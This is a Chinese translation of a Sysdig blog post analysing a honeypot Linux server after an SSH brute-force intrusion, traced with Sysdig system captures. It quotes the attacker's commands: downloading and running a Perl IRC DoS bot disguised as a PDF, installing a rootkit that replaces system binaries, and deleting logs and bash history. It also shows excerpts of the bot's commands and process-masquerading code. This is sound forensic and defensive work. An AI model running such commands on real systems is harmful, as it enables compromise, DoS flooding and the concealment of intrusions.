---
description: Fishing for hackers
---

# 钓黑客：Linux服务器攻击分析。

> Reference: [https://sysdig.com/blog/fishing-for-hackers/](https://sysdig.com/blog/fishing-for-hackers/)

几天前，我偶然发现了一篇经典博客文章，其中发现了加强新的Linux服务器的常见建议：安装fail2ban，禁用SSH密码身份验证，随机化SSH端口，配置iptables等。这让我开始思考：如果我这样做了会怎样？恰恰相反？当然，最常见的结果是成为僵尸网络的受害者，该僵尸网络正在扫描各种各样的公共IP地址，希望找到配置不当的服务以蛮力攻击（SSH或Wordpress等）。但是，当您成为这些简单攻击之一的受害者时，实际发生了什么？攻击者做什么？这篇文章试图通过分析实际的服务器攻击来回答这些问题，这些攻击完全由Sysdig捕获。所以我们去钓鱼吧！

### 陷阱

这样做的目的是在Internet上公开一组易受攻击的，配置错误的服务器，等到有人入侵服务器后再进行分析，从而获得一些乐趣。换句话说：将一些诱饵投入水中，等到鱼开始咬人，然后抓其中一条进行研究。我需要做的第一件事就是诱饵。一堆配置不良的主机。幸运的是，如今这非常容易。我刚刚使用各种IaaS提供商和地区（准确地说是AWS，Rackspace和Digital Ocean）启动了大约20台Ubuntu 12.04服务器，希望这些服务器中至少有一个位于某些僵尸网络的“热门”目标区域那里。接下来，我需要一种方法来正确记录系统活动，以便准确了解攻击者所采取的步骤。因为我喜欢Sysdig（当然！），所以我选择了Sysdig + S3的组合。我将Sysdig配置为在启用压缩的情况下启动（-z），并且可以选择捕获每个I / O缓冲区的大量字节：

```bash
$ sysdig -s 4096 -z -w /mnt/sysdig/$(hostname).scap.gz
```

现在已经配置了所有实例，我只需使用密码作为密码启用root用户SSH登录，以确保即使是最愚蠢的暴力算法也不会立即破坏系统。之后，我只是坐下来，看着我所有的Sysdig转储都交付给S3。

### 中奖！

第一个陷阱很快就来了：仅4个小时后，其中一台服务器就遭到破坏！我怎么知道我立即看到S3存储bucket上的Sysdig跟踪文件跳到了几兆字节-远远超过了空闲计算机本应产生的每小时100KB的背景噪声。因此，我在OSX机器上下载了跟踪文件（大约150MB），并开始对其进行探索。

### 探索服务器攻击

我以通常喜欢的方式开始分析：通过流程，网络和I / O概述系统发生的事情。首先，我查看了被黑客入侵的计算机的网络I/O TOP进程：

```bash
$ sysdig -r trace.scap.gz -c topprocs_net
Bytes     Process
------------------------------
439.63M   /usr/sbin/httpd
422.29M   /usr/local/apac
5.27M     sshd
2.38M     wget
20.81KB   httpd
9.94KB    httpd
6.40KB    perl
```

我没有配置为提供任何服务的服务器，流量非常大！我也不记得安装/usr/sbin/httpd或/usr/local/apac-稍后再介绍。接下来，我更好地研究了网络连接：

```text
$ sysdig -r trace.scap.gz -c topconns
Bytes     Proto     Connection
------------------------------
439.58M   udp       170.170.35.93:50978->39.115.244.150:800
422.24M   udp       170.170.35.93:55169->39.115.244.150:800
4.91M     tcp       85.60.66.5:59893->170.170.35.93:22
46.72KB   tcp       170.170.35.93:39193->162.243.147.173:3132
43.62KB   tcp       170.170.35.93:39194->162.243.147.173:3132
20.81KB   tcp       170.170.35.93:53136->198.148.91.146:6667
1000B     udp       170.170.35.93:0->39.115.244.150:800
```

我的主机产生了800MB的UDP流量-这太疯狂了！这就是DoS攻击。我的猜测是，攻击者安装了一些僵尸网络客户端来按需生成有针对性的DoS，因此在这一点上，我先是关闭了服务器以确保它不会对其他人造成任何进一步的损害。到目前为止，我所获得的所有信息都证实该系统已受到威胁，但是使用其他许多监视工具，我本可以得出相同的结论。但是，这里的区别是我有一个充满细节（这里指的是安装了sysdig并启用记录了的服务器）的S3存储bucket，因此我可以开始挖掘以查看实际发生了什么。我从最喜欢的凿子spy\_users开始，以查看恶意用户登录后执行了什么操作：

```bash
$ sysdig -r trace.scap.gz -c spy_users
06:11:28 root) cd /usr/sbin
06:11:30 root) mkdir .shm
06:11:32 root) cd /usr/sbin/.shm
06:11:39 root) wget xxxxxxxxx.altervista.org/l.tgz
06:11:40 root) tar zxvf l.tgz
06:11:42 root) cd /usr/sbin/.shm/lib/.muh/src
06:11:43 root) /bin/bash ./configure --enable-local
06:11:56 root) make all
```

看看这里发生了什么？攻击者在/usr/sbin中创建了一个隐藏的目录，名称为“ 聪明的” .shm，下载了程序的源代码并开始构建。我从上面的URL下载了文件，结果发现它是IRC服务器Muh。在存档文件中，我发现了其他有趣的东西，例如攻击者的非常个人的配置文件，其中包含各种用户名和密码以及一堆IRC通道，这些通道可以自动加入Undernet（Internet通道中的最大的子网，暗网嘛？）。他接下来要做的是：

```bash
06:13:19 root) wget http://xxxxxxxxx.altervista.org/.sloboz.pdf
06:13:20 root) perl .sloboz.pdf
06:13:20 root) rm -rf .sloboz.pdf
06:12:58 root) /sbin/iptables -I INPUT -p tcp --dport 9000 -j ACCEPT
06:12:58 root) /sbin/iptables -I OUTPUT -p tcp --dport 6667 -j ACCEPT
```

真好！一个Perl脚本，以隐藏的pdf文件格式下载。现在我很想了解更多。不幸的是，当我尝试访问上面的URL时，该文件不再存在。好的，Sysdig能够为我提供帮助，因为它记录了每个I / O操作（每个I / O操作最多记录4096字节的数据，正如我在命令行中指定的那样）。我可以看一下wget写的文件：

```bash
$ sysdig -r trace.scap.gz -A -c echo_fds fd.filename=.sloboz.pdf
------ Write 3.89KB to /run/shm/.sloboz.pdf
#!/usr/bin/perl
####################################################################################################################
####################################################################################################################
##  Undernet Perl IrcBot v1.02012 bY DeBiL @RST Security Team   ## [ Help ] #########################################
##      Stealth MultiFunctional IrcBot Writen in Perl          #####################################################
##        Teste on every system with PERL instlled             ##  !u @system                                     ##
##                                                             ##  !u @version                                    ##
##     This is a free program used on your own risk.           ##  !u @channel                                    ##
##        Created for educational purpose only.                ##  !u @flood                                      ##
## I'm not responsible for the illegal use of this program.    ##  !u @utils                                      ##
####################################################################################################################
## [ Channel ] #################### [ Flood ] ################################## [ Utils ] #########################
####################################################################################################################
## !u !join <#channel>          ## !u @udp1 <ip> <port> <time>              ##  !su @conback <ip> <port>          ##
## !u !part <#channel>          ## !u @udp2 <ip> <packet size> <time>       ##  !u @downlod <url+path> <file>     ##
## !u !uejoin <#channel>        ## !u @udp3 <ip> <port> <time>              ##  !u @portscan <ip>                 ##
## !u !op <channel> <nick>      ## !u @tcp <ip> <port> <packet size> <time> ##  !u @mail <subject> <sender>       ##
## !u !deop <channel> <nick>    ## !u @http <site> <time>                   ##           <recipient> <message>    ##
...
```

有趣的是，这真是一个可以从IRC命令的perl DoS客户端，因此攻击者可以轻松地管理大量此类机器。我也很幸运，wget一直在进行4KB I / O操作，因此，如果查看所有输出，就可以准确看到完整的源代码（上面已截断）。通读标题，我们可以看到它是如何工作的，它应该会收到@udp IRC消息，然后向受害者发送大量网络流量。让我们看看是否有人向它发送了命令：

```bash
$ sysdig -r trace.scap.gz -A -c echo_fds evt.buffer contains @udp
------ Read 67B from 170.170.35.93:39194->162.243.147.173:3132
:x!~xxxxxxxxx@xxxxxxxxx.la PRIVMSG #nanana :!u @udp1 39.115.244.150 800 300
```

如您所见，僵尸程序收到了一个TCP连接（大概是来自其所有者的），其中包含一个攻击端口800上IP 39.115.244.150的命令，该地址与我们在连接列表开头看到的IP和端口完全相同拥有数百兆的流量。这一切都说得通！但是服务器攻击并没有止步于此：

```bash
06:13:11 root) wget xxxxxxxxx.xp3.biz/other/rk.tar
06:13:12 root) tar xvf rk.tar
06:13:12 root) rm -rf rk.tar
06:13:12 root) cd /usr/sbin/rk
06:13:17 root) tar zxf mafixlibs
```

这是什么mafixlibs？Google表示它是某种rootkit，但我想查看该tar文件中包含的内容，因此我将再次使用sysdig，询问该tar进程编写的文件是什么：

```bash
$ sysdig -r trace.scap.gz -c topfiles_bytes proc.name contains tar and proc.args contains mafixlibs
Bytes     Filename
------------------------------
207.76KB  /usr/sbin/rk/bin/.sh/sshd
91.29KB   /usr/sbin/rk/bin/ttymon
80.69KB   /usr/sbin/rk/bin/lsof
58.14KB   /usr/sbin/rk/bin/find
38.77KB   /usr/sbin/rk/bin/dir
38.77KB   /usr/sbin/rk/bin/ls
33.05KB   /usr/sbin/rk/bin/lib/libproc.a
30.77KB   /usr/sbin/rk/bin/ifconfig
30.71KB   /usr/sbin/rk/bin/md5sum
25.88KB   /usr/sbin/rk/bin/syslogd
```

嗯，现在很清楚：一堆受损的二进制文件。因此，我猜想在我的spy\_users输出中，攻击者将替换系统用户：

```bash
06:13:18 root) chattr -isa /sbin/ifconfig
06:13:18 root) cp /sbin/ifconfig /usr/lib/libsh/.backup
06:13:18 root) mv -f ifconfig /sbin/ifconfig
06:13:18 root) chattr +isa /sbin/ifconfig
```

确实。他甚至还很友善，可以给我留下备份。到目前为止，一切都很好：我有几个IRC机器人，一些受损的系统二进制文件，并且设法解释了开始时看到的UDP流量泛滥。剩下的只有一件事：为什么topprocs\_net向我显示所有UDP流量都是由/usr/sbin/httpd和/usr/local/apac进程生成的，这些二进制文件我什至都没有看到从spy\_users输出？我猜想perl机器人本身就是发送UDP数据包的机器人，因为它是接收命令的机器人。让我们再次使用Sysdig并进入系统调用级别。我想查看与/usr/local/apac相关的所有事件：

```bash
$ sysdig -r trace.scap.gz -A evt.args contains /usr/local/apac
...
955716 06:13:20.225363385 0 perl (10200) < clone res=10202(perl) exe=/usr/local/apach args= tid=10200(perl) pid=10200(perl) ptid=7748(-bash) cwd=/tmp fdlimit=1024 flags=0 uid=0 gid=0 exepath=/usr/bin/perl
...
```

而且，当我们在这里时，我也想看看何时使用pid 10200进行此perl进程：

```bash
$ sysdig -r trace.scap.gz proc.pid = 10200
954458 06:13:20.111764417 0 perl (10200) < execve res=0 exe=perl args=.sloboz.pdf. tid=10200(perl) pid=10200(perl) ptid=7748(-bash) cwd=/run/shm fdlimit=1024 exepath=/usr/bin/perl
```

令人怀疑的是，perl进程只不过是我们之前看到的.sloboz.pdf。但是你看到发生了什么吗？对于未经训练的人来说可能是棘手的：perl进程（大概是DoS客户端）派生了自己（克隆事件955716），但是在此之前的某个时候，它从perl .sloboz更改了其可执行文件的名称和自变量（exe和args）。.pdf（事件954458）转换为随机的，非可疑的/usr/local/apach（事件955716）。这会混淆ps，top和sysdig等工具。当然没有/usr/local/apach。您可以看到，在派生（fork）之后，该进程从未执行过新的二进制文件，而只是更改了名称。通过阅读perl客户端的源代码（总是带有echo\_fds），我能够确认所有这些信息：

```bash
my @rps = ("/usr/local/apache/bin/httpd -DSSL","/usr/sbin/httpd -k start -DSSL","/usr/sbin/httpd","/usr/sbin/sshd -i","/usr/sbin/sshd","/usr/sbin/sshd -D","/sbin/syslogd","/sbin/klogd -c 1 -x -x","/usr/sbin/acpid","/usr/sbin/cron");

my $process = $rps[rand scalar @rps];

$0="$process".""x16;;

my $pid=fork;
```

perl进程将其argv更改为一个随机的通用名称，然后将其自身派生出来，以进行守护。最终，攻击者决定摆脱这些日志，并用新日志替换它们：

```bash
06:13:30 root) rm -rf /var/log/wtmp
06:13:30 root) rm -rf /var/log/lastlog
06:13:30 root) rm -rf /var/log/secure
06:13:30 root) rm -rf /var/log/xferlog
06:13:30 root) rm -rf /var/log/messages
06:13:30 root) rm -rf /var/run/utmp
06:13:30 root) touch /var/run/utmp
06:13:30 root) touch /var/log/messages
06:13:30 root) touch /var/log/wtmp
06:13:30 root) touch /var/log/messages
06:13:30 root) touch /var/log/xferlog
06:13:30 root) touch /var/log/secure
06:13:30 root) touch /var/log/lastlog
06:13:30 root) rm -rf /var/log/maillog
06:13:30 root) touch /var/log/maillog
06:13:30 root) rm -rf /root/.bash_history
06:13:30 root) touch /root/.bash_history
```

### 总结一下

哇。通过从很高的层次开始分析，并在必要时一直深入到单个系统调用，我几乎可以准确地跟踪发生了什么。在我的实例完全关闭的情况下，只需使用一个包含系统所有活动的Sysdig跟踪文件即可！

### 写在最后

* 此博客文章中的所有IP地址和URL都是随机的或隐藏的，因为其中一些受攻击的服务器可能仍然存在并且可以访问，并且我不想再透露它们了。
* 由于跟踪文件的爆炸，在负载很重的生产环境中进行连续捕获可能会更加困难，尤其是在捕获I / O缓冲区的情况下。设置良好的捕获过滤器（例如，过滤掉主要Web服务器进程的事件）可以大大减轻这种情况。
* 我本来可以去研究packetstormsecurity，自己获取最新最聪明的利用/rootkit的漏洞，然后自己进行整个模拟，但是看到事情真的发生是另一回事，写这篇文章真是太有趣了，你甚至都无法想象！

我在帖子中省略了很多有趣的细节-请留下任何评论，我很高兴继续对话！

